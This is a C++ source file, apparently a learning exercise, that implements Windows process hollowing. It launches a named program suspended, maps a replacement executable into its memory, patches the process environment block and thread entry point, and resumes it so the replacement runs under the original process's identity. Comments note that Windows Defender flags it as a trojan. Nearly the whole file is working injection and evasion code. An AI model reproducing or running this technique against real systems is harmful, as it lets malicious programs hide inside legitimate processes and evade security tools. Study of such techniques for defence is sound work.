// Hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

//This program seems to be blocked by windows defender in windows 10: Trojan:Script/Wacatac.B!ml

//The main difficulty here is finding the correct addresses and size when patching the target process
//This will need to be investigated further at a later date to ensure an appropriate understanding


#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <ImageHlp.h> //I believe this lib is for workig images in memory
#include <assert.h>
#include <winternl.h>


#pragma comment(lib, "imagehlp")
#pragma comment(lib,  "ntdll")

PROCESS_INFORMATION pi;

int Error(const char* msg) {
	printf("%s (%u)\n", msg, ::GetLastError());
	if(pi.hProcess)
		TerminateProcess(pi.hProcess, 0);
	return 1;
}


int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: Hollow <image_name> <replacement_exe>");
		return 0;
	}


	auto name = argv[1];
	auto replace = argv[2];

	STARTUPINFOA si = { sizeof(si) };
	//This starts a process but in suspended state allow provisioning of the runtime requirements
	if (!CreateProcessA(nullptr, name, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
		return Error("Failed to create process");

	printf("Created PID: %u\n", pi.dwProcessId);

	//Set directory to replacement exe location
	WCHAR path[MAX_PATH];
	GetModuleFileName(nullptr, path, _countof(path));
	*wcsrchr(path, L'\\') = 0;
	SetCurrentDirectory(path);


	//Creates file to local file that will be loaded in to the runtime process
	HANDLE hFile = CreateFileA(replace, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return Error("Failed to open file");


	//Allocate space in the new process that is equal to the size of replacement exe
	PVOID newAddress = VirtualAllocEx(pi.hProcess, nullptr, GetFileSize(hFile, nullptr) + (1 << 16), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!newAddress)
		return Error("Failed to allocate memory");

	printf("Addres in target process: 0x%p\n", newAddress);

	ULONG orgSize, newSize;
	ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;


	//I believe this realigns exe to ensure it can accomate the replacement exe
	if (!ReBaseImage64(replace, nullptr, TRUE, FALSE, FALSE, 0, &orgSize, &oldImageBase, &newSize, &newImageBase, 0))
		return Error("Failed to rebase image");


	//Enables copying a file into memory by reading it on disk
	HANDLE hMemFile = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
	if (!hMemFile)
		return Error("Failed to create MMF");

	CloseHandle(hFile);


	//This maps it to the target process in general
	PVOID address = MapViewOfFileEx(hMemFile, FILE_MAP_READ, 0, 0, 0, newAddress);
	if (!address)
		return Error("Failed to map in requested address");

	auto dosHeader = (PIMAGE_DOS_HEADER)address;
	auto nt = (PIMAGE_NT_HEADERS)((BYTE*)address + dosHeader->e_lfanew);
	auto sections = (PIMAGE_SECTION_HEADER)(nt + 1);

	SIZE_T written;

	WriteProcessMemory(pi.hProcess, (PVOID)newAddress, (PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfHeaders, &written);


	//The main thing here is copyig the data from .text section in to the target process 
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory(pi.hProcess, PVOID((PBYTE)newAddress + sections[i].VirtualAddress),
			PVOID(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase), sections[i].SizeOfRawData, &written);
	}

	PROCESS_BASIC_INFORMATION pbi;
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	PVOID peb = pbi.PebBaseAddress;

	//Path PEB image for the target process
	WriteProcessMemory(pi.hProcess, (PBYTE)peb + sizeof(PVOID) * 2, &nt->OptionalHeader.ImageBase, sizeof(PVOID), &written);

	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi.hThread, &context);


	//I believe this ensures the base pointer in memory is at the correct address
#ifdef _WIN64
	context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress);
#else
	context.Ebx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress);
#endif
	SetThreadContext(pi.hThread, &context);

	UnmapViewOfFile(address);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;


}